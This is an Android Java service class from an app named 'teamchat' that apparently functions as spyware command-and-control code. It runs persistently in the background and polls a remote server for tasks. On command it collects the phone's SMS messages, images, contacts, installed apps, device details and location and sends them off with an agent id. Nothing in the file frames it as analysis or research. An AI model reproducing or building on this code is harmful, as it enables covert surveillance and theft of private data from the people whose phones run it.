package com.example.teamchat;


import static com.example.teamchat.Constants.*;
import com.example.teamchat.HttpConnection.*;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONObject;

import java.io.IOException;

public class ChatService extends Service {
    private final static String TAG = ChatService.class.getSimpleName();
    private String Id;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.v(TAG, "Service started");
        final Handler handler = new Handler();

        handler.postDelayed(new Runnable() {
            RunTask myTask;

            @Override
            public void run() {
                Log.v(TAG, "New Execution");
                if (myTask != null) {
                    // Prevent same task from being executed
                    switch(myTask.getStatus()) {
                        case PENDING:
                        case RUNNING:
                            break;
                        case FINISHED:
                            myTask = new RunTask();
                            myTask.execute();
                            break;
                    }
                }
                else {
                    myTask = new RunTask();
                    myTask.execute();
                }
                handler.postDelayed(this, DELAY);
            }
        }, DELAY);

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    private class RunTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            ReturnResponse response = null;
            try {
                response = HttpConnection.connect(SERVER + "updog", "GET", null);
            } catch (IOException e) {
                e.printStackTrace();
            }

            // Server is down
            if (response == null) {
                Log.v(TAG, "Null response");
                return null;
            }

            // Check that its the correct server we are connecting to
            String body = response.body;
            if (body.equals(UPDOG)) {
                handleConnection();
            } else {
                Log.v(TAG, "Keyword fail, keyword: " + body);
            }

            return null;
        }
    }
    private void handleConnection() {
        // Retrieve cached id
        String id = getId();

        // Register if no id
        if (id.equals("")) {
            register();
        }
        else {
            String task = getTask();
            if (task != null) {
                switch (task) {
                    case "register":
                        register();
                        break;
                    case "sms":
                        handleSMS();
                        break;
                    case "images":
                        handleImages();
                        break;
                    case "app":
                        handleApps();
                        break;
                    case "phonedetails":
                        handlePhoneDetails();
                        break;
                    case "contacts":
                        handleContacts();
                        break;
                    case "location":
                        handleLocation();
                    default:
                        break;
                }
            }
        }
    }


    private String getId() {
        if (this.Id == null) {
            // Retrieve cached id
            SharedPreferences sharedPref = getApplicationContext().getSharedPreferences(PREFS_NAME, 0);
            this.Id = sharedPref.getString("id", "");
        }
        return this.Id;
    }

    private void register() {
        Log.v(TAG, "Registering");

        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("key", KEY);

            ReturnResponse response = HttpConnection.connect(SERVER + "reg", "POST", jsonObject.toString());
            if (response == null) {
                return;
            }

            if (response.responseCode == 200) {
                this.Id = response.body;

                // Save Id to cache
                SharedPreferences sharedPref = getApplicationContext().getSharedPreferences(PREFS_NAME, 0);
                SharedPreferences.Editor editor = sharedPref.edit();
                editor.putString("id", this.Id);
                editor.apply();
            }

        } catch (Exception e) {
            Log.e(TAG, "Error with register ", e);
        }
        Log.v(TAG, "Agent ID: " + this.Id);
    }

    private String getTask() {
        Log.v(TAG, "Getting Task");
        try {
            ReturnResponse response = HttpConnection.connect(SERVER + "task/" + this.Id, "GET", null);
            if (response == null) {
                return "";
            }

            if (response.responseCode == 200) {
                Log.v(TAG, "Received task: " + response.body);
                return response.body;
            }
            else if (response.responseCode == 201) {
                Log.v(TAG, "No task found");
                return "";
            }
            else if (response.responseCode == 204) {
                Log.v(TAG, "Server does not have you id, registering");
                return "register";
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private void handleSMS() {
        Context context = getApplicationContext();
        try {
            SmsReader.readSMS(context, getId());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void handleImages() {
        Context context = getApplicationContext();
        try {
            ImageSender.readImages(context, getId());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private void handleApps() {
        final PackageManager pm = getPackageManager();
        try {
            AppLister.ListApps(pm, getId());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void handlePhoneDetails(){
        Context context = getApplicationContext();
        try {
            PhoneDetails.getAllDetails(context, getId());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void handleContacts(){
        Context context = getApplicationContext();
        try {
            Contacts.getContacts(context, getId());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void handleLocation()
    {
        Context context = getApplicationContext();
        try{
            LocationTracker.getLocation(context, getId());
        } catch (Exception e)
        {
            e.printStackTrace();
        }
    }
}
